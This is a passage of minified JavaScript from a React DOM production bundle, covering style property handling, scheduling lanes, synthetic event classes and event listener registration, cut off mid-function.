Ja={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},aP=["Webkit","ms","Moz","O"];Object.keys(Ja).forEach(function(t){aP.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),Ja[e]=Ja[t]})});function VE(t,e,n){return e==null||typeof e=="boolean"||e===""?"":n||typeof e!="number"||e===0||Ja.hasOwnProperty(t)&&Ja[t]?(""+e).trim():e+"px"}function HE(t,e){t=t.style;for(var n in e)if(e.hasOwnProperty(n)){var r=n.indexOf("--")===0,i=VE(n,e[n],r);n==="float"&&(n="cssFloat"),r?t.setProperty(n,i):t[n]=i}}var lP=Ue({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Lp(t,e){if(e){if(lP[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error($(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error($(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error($(61))}if(e.style!=null&&typeof e.style!="object")throw Error($(62))}}function Fp(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Up=null;function Ng(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var $p=null,lo=null,co=null;function W0(t){if(t=sc(t)){if(typeof $p!="function")throw Error($(280));var e=t.stateNode;e&&(e=ih(e),$p(t.stateNode,t.type,e))}}function WE(t){lo?co?co.push(t):co=[t]:lo=t}function KE(){if(lo){var t=lo,e=co;if(co=lo=null,W0(t),e)for(t=0;t<e.length;t++)W0(e[t])}}function GE(t,e){return t(e)}function qE(){}var bf=!1;function YE(t,e,n){if(bf)return t(e,n);bf=!0;try{return GE(t,e,n)}finally{bf=!1,(lo!==null||co!==null)&&(qE(),KE())}}function _l(t,e){var n=t.stateNode;if(n===null)return null;var r=ih(n);if(r===null)return null;n=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error($(231,e,typeof n));return n}var zp=!1;if(Ir)try{var Oa={};Object.defineProperty(Oa,"passive",{get:function(){zp=!0}}),window.addEventListener("test",Oa,Oa),window.removeEventListener("test",Oa,Oa)}catch{zp=!1}function cP(t,e,n,r,i,s,o,a,c){var u=Array.prototype.slice.call(arguments,3);try{e.apply(n,u)}catch(p){this.onError(p)}}var Za=!1,Qu=null,Xu=!1,Bp=null,uP={onError:function(t){Za=!0,Qu=t}};function dP(t,e,n,r,i,s,o,a,c){Za=!1,Qu=null,cP.apply(uP,arguments)}function hP(t,e,n,r,i,s,o,a,c){if(dP.apply(this,arguments),Za){if(Za){var u=Qu;Za=!1,Qu=null}else throw Error($(198));Xu||(Xu=!0,Bp=u)}}function Os(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function QE(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function K0(t){if(Os(t)!==t)throw Error($(188))}function fP(t){var e=t.alternate;if(!e){if(e=Os(t),e===null)throw Error($(188));return e!==t?null:t}for(var n=t,r=e;;){var i=n.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return K0(i),t;if(s===r)return K0(i),e;s=s.sibling}throw Error($(188))}if(n.return!==r.return)n=i,r=s;else{for(var o=!1,a=i.child;a;){if(a===n){o=!0,n=i,r=s;break}if(a===r){o=!0,r=i,n=s;break}a=a.sibling}if(!o){for(a=s.child;a;){if(a===n){o=!0,n=s,r=i;break}if(a===r){o=!0,r=s,n=i;break}a=a.sibling}if(!o)throw Error($(189))}}if(n.alternate!==r)throw Error($(190))}if(n.tag!==3)throw Error($(188));return n.stateNode.current===n?t:e}function XE(t){return t=fP(t),t!==null?JE(t):null}function JE(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=JE(t);if(e!==null)return e;t=t.sibling}return null}var ZE=rn.unstable_scheduleCallback,G0=rn.unstable_cancelCallback,pP=rn.unstable_shouldYield,mP=rn.unstable_requestPaint,Ge=rn.unstable_now,gP=rn.unstable_getCurrentPriorityLevel,kg=rn.unstable_ImmediatePriority,eC=rn.unstable_UserBlockingPriority,Ju=rn.unstable_NormalPriority,vP=rn.unstable_LowPriority,tC=rn.unstable_IdlePriority,eh=null,Zn=null;function yP(t){if(Zn&&typeof Zn.onCommitFiberRoot=="function")try{Zn.onCommitFiberRoot(eh,t,void 0,(t.current.flags&128)===128)}catch{}}var On=Math.clz32?Math.clz32:xP,_P=Math.log,wP=Math.LN2;function xP(t){return t>>>=0,t===0?32:31-(_P(t)/wP|0)|0}var Gc=64,qc=4194304;function qa(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function Zu(t,e){var n=t.pendingLanes;if(n===0)return 0;var r=0,i=t.suspendedLanes,s=t.pingedLanes,o=n&268435455;if(o!==0){var a=o&~i;a!==0?r=qa(a):(s&=o,s!==0&&(r=qa(s)))}else o=n&~i,o!==0?r=qa(o):s!==0&&(r=qa(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=r;0<e;)n=31-On(e),i=1<<n,r|=t[n],e&=~i;return r}function EP(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function CP(t,e){for(var n=t.suspendedLanes,r=t.pingedLanes,i=t.expirationTimes,s=t.pendingLanes;0<s;){var o=31-On(s),a=1<<o,c=i[o];c===-1?(!(a&n)||a&r)&&(i[o]=EP(a,e)):c<=e&&(t.expiredLanes|=a),s&=~a}}function Vp(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function nC(){var t=Gc;return Gc<<=1,!(Gc&4194240)&&(Gc=64),t}function Tf(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function rc(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-On(e),t[e]=n}function SP(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var r=t.eventTimes;for(t=t.expirationTimes;0<n;){var i=31-On(n),s=1<<i;e[i]=0,r[i]=-1,t[i]=-1,n&=~s}}function Pg(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var r=31-On(n),i=1<<r;i&e|t[r]&e&&(t[r]|=e),n&=~i}}var xe=0;function rC(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var iC,Rg,sC,oC,aC,Hp=!1,Yc=[],gi=null,vi=null,yi=null,wl=new Map,xl=new Map,ti=[],bP="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function q0(t,e){switch(t){case"focusin":case"focusout":gi=null;break;case"dragenter":case"dragleave":vi=null;break;case"mouseover":case"mouseout":yi=null;break;case"pointerover":case"pointerout":wl.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":xl.delete(e.pointerId)}}function Da(t,e,n,r,i,s){return t===null||t.nativeEvent!==s?(t={blockedOn:e,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=sc(e),e!==null&&Rg(e)),t):(t.eventSystemFlags|=r,e=t.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),t)}function TP(t,e,n,r,i){switch(e){case"focusin":return gi=Da(gi,t,e,n,r,i),!0;case"dragenter":return vi=Da(vi,t,e,n,r,i),!0;case"mouseover":return yi=Da(yi,t,e,n,r,i),!0;case"pointerover":var s=i.pointerId;return wl.set(s,Da(wl.get(s)||null,t,e,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,xl.set(s,Da(xl.get(s)||null,t,e,n,r,i)),!0}return!1}function lC(t){var e=cs(t.target);if(e!==null){var n=Os(e);if(n!==null){if(e=n.tag,e===13){if(e=QE(n),e!==null){t.blockedOn=e,aC(t.priority,function(){sC(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Su(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=Wp(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var r=new n.constructor(n.type,n);Up=r,n.target.dispatchEvent(r),Up=null}else return e=sc(n),e!==null&&Rg(e),t.blockedOn=n,!1;e.shift()}return!0}function Y0(t,e,n){Su(t)&&n.delete(e)}function IP(){Hp=!1,gi!==null&&Su(gi)&&(gi=null),vi!==null&&Su(vi)&&(vi=null),yi!==null&&Su(yi)&&(yi=null),wl.forEach(Y0),xl.forEach(Y0)}function ja(t,e){t.blockedOn===e&&(t.blockedOn=null,Hp||(Hp=!0,rn.unstable_scheduleCallback(rn.unstable_NormalPriority,IP)))}function El(t){function e(i){return ja(i,t)}if(0<Yc.length){ja(Yc[0],t);for(var n=1;n<Yc.length;n++){var r=Yc[n];r.blockedOn===t&&(r.blockedOn=null)}}for(gi!==null&&ja(gi,t),vi!==null&&ja(vi,t),yi!==null&&ja(yi,t),wl.forEach(e),xl.forEach(e),n=0;n<ti.length;n++)r=ti[n],r.blockedOn===t&&(r.blockedOn=null);for(;0<ti.length&&(n=ti[0],n.blockedOn===null);)lC(n),n.blockedOn===null&&ti.shift()}var uo=Lr.ReactCurrentBatchConfig,ed=!0;function NP(t,e,n,r){var i=xe,s=uo.transition;uo.transition=null;try{xe=1,Ag(t,e,n,r)}finally{xe=i,uo.transition=s}}function kP(t,e,n,r){var i=xe,s=uo.transition;uo.transition=null;try{xe=4,Ag(t,e,n,r)}finally{xe=i,uo.transition=s}}function Ag(t,e,n,r){if(ed){var i=Wp(t,e,n,r);if(i===null)Mf(t,e,r,td,n),q0(t,r);else if(TP(i,t,e,n,r))r.stopPropagation();else if(q0(t,r),e&4&&-1<bP.indexOf(t)){for(;i!==null;){var s=sc(i);if(s!==null&&iC(s),s=Wp(t,e,n,r),s===null&&Mf(t,e,r,td,n),s===i)break;i=s}i!==null&&r.stopPropagation()}else Mf(t,e,r,null,n)}}var td=null;function Wp(t,e,n,r){if(td=null,t=Ng(r),t=cs(t),t!==null)if(e=Os(t),e===null)t=null;else if(n=e.tag,n===13){if(t=QE(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return td=t,null}function cC(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(gP()){case kg:return 1;case eC:return 4;case Ju:case vP:return 16;case tC:return 536870912;default:return 16}default:return 16}}var hi=null,Og=null,bu=null;function uC(){if(bu)return bu;var t,e=Og,n=e.length,r,i="value"in hi?hi.value:hi.textContent,s=i.length;for(t=0;t<n&&e[t]===i[t];t++);var o=n-t;for(r=1;r<=o&&e[n-r]===i[s-r];r++);return bu=i.slice(t,1<r?1-r:void 0)}function Tu(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function Qc(){return!0}function Q0(){return!1}function an(t){function e(n,r,i,s,o){this._reactName=n,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var a in t)t.hasOwnProperty(a)&&(n=t[a],this[a]=n?n(s):s[a]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?Qc:Q0,this.isPropagationStopped=Q0,this}return Ue(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=Qc)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=Qc)},persist:function(){},isPersistent:Qc}),e}var Yo={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Dg=an(Yo),ic=Ue({},Yo,{view:0,detail:0}),PP=an(ic),If,Nf,Ma,th=Ue({},ic,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:jg,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Ma&&(Ma&&t.type==="mousemove"?(If=t.screenX-Ma.screenX,Nf=t.screenY-Ma.screenY):Nf=If=0,Ma=t),If)},movementY:function(t){return"movementY"in t?t.movementY:Nf}}),X0=an(th),RP=Ue({},th,{dataTransfer:0}),AP=an(RP),OP=Ue({},ic,{relatedTarget:0}),kf=an(OP),DP=Ue({},Yo,{animationName:0,elapsedTime:0,pseudoElement:0}),jP=an(DP),MP=Ue({},Yo,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),LP=an(MP),FP=Ue({},Yo,{data:0}),J0=an(FP),UP={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},$P={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},zP={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function BP(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=zP[t])?!!e[t]:!1}function jg(){return BP}var VP=Ue({},ic,{key:function(t){if(t.key){var e=UP[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Tu(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?$P[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:jg,charCode:function(t){return t.type==="keypress"?Tu(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Tu(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),HP=an(VP),WP=Ue({},th,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Z0=an(WP),KP=Ue({},ic,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:jg}),GP=an(KP),qP=Ue({},Yo,{propertyName:0,elapsedTime:0,pseudoElement:0}),YP=an(qP),QP=Ue({},th,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),XP=an(QP),JP=[9,13,27,32],Mg=Ir&&"CompositionEvent"in window,el=null;Ir&&"documentMode"in document&&(el=document.documentMode);var ZP=Ir&&"TextEvent"in window&&!el,dC=Ir&&(!Mg||el&&8<el&&11>=el),e_=" ",t_=!1;function hC(t,e){switch(t){case"keyup":return JP.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function fC(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var Ys=!1;function eR(t,e){switch(t){case"compositionend":return fC(e);case"keypress":return e.which!==32?null:(t_=!0,e_);case"textInput":return t=e.data,t===e_&&t_?null:t;default:return null}}function tR(t,e){if(Ys)return t==="compositionend"||!Mg&&hC(t,e)?(t=uC(),bu=Og=hi=null,Ys=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return dC&&e.locale!=="ko"?null:e.data;default:return null}}var nR={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function n_(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!nR[t.type]:e==="textarea"}function pC(t,e,n,r){WE(r),e=nd(e,"onChange"),0<e.length&&(n=new Dg("onChange","change",null,n,r),t.push({event:n,listeners:e}))}var tl=null,Cl=null;function rR(t){bC(t,0)}function nh(t){var e=Js(t);if(FE(e))return t}function iR(t,e){if(t==="change")return e}var mC=!1;if(Ir){var Pf;if(Ir){var Rf="oninput"in document;if(!Rf){var r_=document.createElement("div");r_.setAttribute("oninput","return;"),Rf=typeof r_.oninput=="function"}Pf=Rf}else Pf=!1;mC=Pf&&(!document.documentMode||9<document.documentMode)}function i_(){tl&&(tl.detachEvent("onpropertychange",gC),Cl=tl=null)}function gC(t){if(t.propertyName==="value"&&nh(Cl)){var e=[];pC(e,Cl,t,Ng(t)),YE(rR,e)}}function sR(t,e,n){t==="focusin"?(i_(),tl=e,Cl=n,tl.attachEvent("onpropertychange",gC)):t==="focusout"&&i_()}function oR(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return nh(Cl)}function aR(t,e){if(t==="click")return nh(e)}function lR(t,e){if(t==="input"||t==="change")return nh(e)}function cR(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var Mn=typeof Object.is=="function"?Object.is:cR;function Sl(t,e){if(Mn(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),r=Object.keys(e);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Ip.call(e,i)||!Mn(t[i],e[i]))return!1}return!0}function s_(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function o_(t,e){var n=s_(t);t=0;for(var r;n;){if(n.nodeType===3){if(r=t+n.textContent.length,t<=e&&r>=e)return{node:n,offset:e-t};t=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=s_(n)}}function vC(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?vC(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function yC(){for(var t=window,e=Yu();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=Yu(t.document)}return e}function Lg(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function uR(t){var e=yC(),n=t.focusedElem,r=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&vC(n.ownerDocument.documentElement,n)){if(r!==null&&Lg(n)){if(e=r.start,t=r.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!t.extend&&s>r&&(i=r,r=s,s=i),i=o_(n,s);var o=o_(n,r);i&&o&&(t.rangeCount!==1||t.anchorNode!==i.node||t.anchorOffset!==i.offset||t.focusNode!==o.node||t.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),t.removeAllRanges(),s>r?(t.addRange(e),t.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var dR=Ir&&"documentMode"in document&&11>=document.documentMode,Qs=null,Kp=null,nl=null,Gp=!1;function a_(t,e,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Gp||Qs==null||Qs!==Yu(r)||(r=Qs,"selectionStart"in r&&Lg(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),nl&&Sl(nl,r)||(nl=r,r=nd(Kp,"onSelect"),0<r.length&&(e=new Dg("onSelect","select",null,e,n),t.push({event:e,listeners:r}),e.target=Qs)))}function Xc(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var Xs={animationend:Xc("Animation","AnimationEnd"),animationiteration:Xc("Animation","AnimationIteration"),animationstart:Xc("Animation","AnimationStart"),transitionend:Xc("Transition","TransitionEnd")},Af={},_C={};Ir&&(_C=document.createElement("div").style,"AnimationEvent"in window||(delete Xs.animationend.animation,delete Xs.animationiteration.animation,delete Xs.animationstart.animation),"TransitionEvent"in window||delete Xs.transitionend.transition);function rh(t){if(Af[t])return Af[t];if(!Xs[t])return t;var e=Xs[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in _C)return Af[t]=e[n];return t}var wC=rh("animationend"),xC=rh("animationiteration"),EC=rh("animationstart"),CC=rh("transitionend"),SC=new Map,l_="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Wi(t,e){SC.set(t,e),As(e,[t])}for(var Of=0;Of<l_.length;Of++){var Df=l_[Of],hR=Df.toLowerCase(),fR=Df[0].toUpperCase()+Df.slice(1);Wi(hR,"on"+fR)}Wi(wC,"onAnimationEnd");Wi(xC,"onAnimationIteration");Wi(EC,"onAnimationStart");Wi("dblclick","onDoubleClick");Wi("focusin","onFocus");Wi("focusout","onBlur");Wi(CC,"onTransitionEnd");Ro("onMouseEnter",["mouseout","mouseover"]);Ro("onMouseLeave",["mouseout","mouseover"]);Ro("onPointerEnter",["pointerout","pointerover"]);Ro("onPointerLeave",["pointerout","pointerover"]);As("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));As("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));As("onBeforeInput",["compositionend","keypress","textInput","paste"]);As("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));As("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));As("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ya="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),pR=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ya));function c_(t,e,n){var r=t.type||"unknown-event";t.currentTarget=n,hP(r,e,void 0,t),t.currentTarget=null}function bC(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var r=t[n],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var a=r[o],c=a.instance,u=a.currentTarget;if(a=a.listener,c!==s&&i.isPropagationStopped())break e;c_(i,a,u),s=c}else for(o=0;o<r.length;o++){if(a=r[o],c=a.instance,u=a.currentTarget,a=a.listener,c!==s&&i.isPropagationStopped())break e;c_(i,a,u),s=c}}}if(Xu)throw t=Bp,Xu=!1,Bp=null,t}function De(t,e){var n=e[Jp];n===void 0&&(n=e[Jp]=new Set);var r=t+"__bubble";n.has(r)||(TC(e,t,2,!1),n.add(r))}function jf(t,e,n){var r=0;e&&(r|=4),TC(n,t,r,e)}var Jc="_reactListening"+Math.random().toString(36).slice(2);function bl(t){if(!t[Jc]){t[Jc]=!0,OE.forEach(function(n){n!=="selectionchange"&&(pR.has(n)||jf(n,!1,t),jf(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[Jc]||(e[Jc]=!0,jf("selectionchange",!1,e))}}function TC(t,e,n,r){switch(cC(e)){case 1:var i=NP;break;case 4:i=kP;break;default:i=Ag}n=i.bind(null,e,n,t),i=void 0,!zp||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?t.addEventListener(e,n,{capture:!0,passive:i}):t.addEventListener(e,n,!0):i!==void 0?t.addEventListener(e,n,{passive:i}):t.addEventListener(e,n,!1)}function Mf(t,e,n,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var a=r.stateNode.containerInfo;if(a===i||a.nodeType===8&&a.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var c=o.tag;if((c===3||c===4)&&(c=o.stateNode.containerInfo,c===i||c.nodeType===8&&c.parentNode===i))return;o=o.return}for(;a!==null;){if(o=cs(a),o===null)return;if(c=o.tag,c===5||c===6){r=s=o;continue e}a=a.parentNode}}r=r.return}YE(function(){var u=s,p=Ng(n),f=[];e:{var h=SC.get(t);if(h!==void 0){var E=Dg,_=t;switch(t){case"keypress":if(Tu(n)===0)break 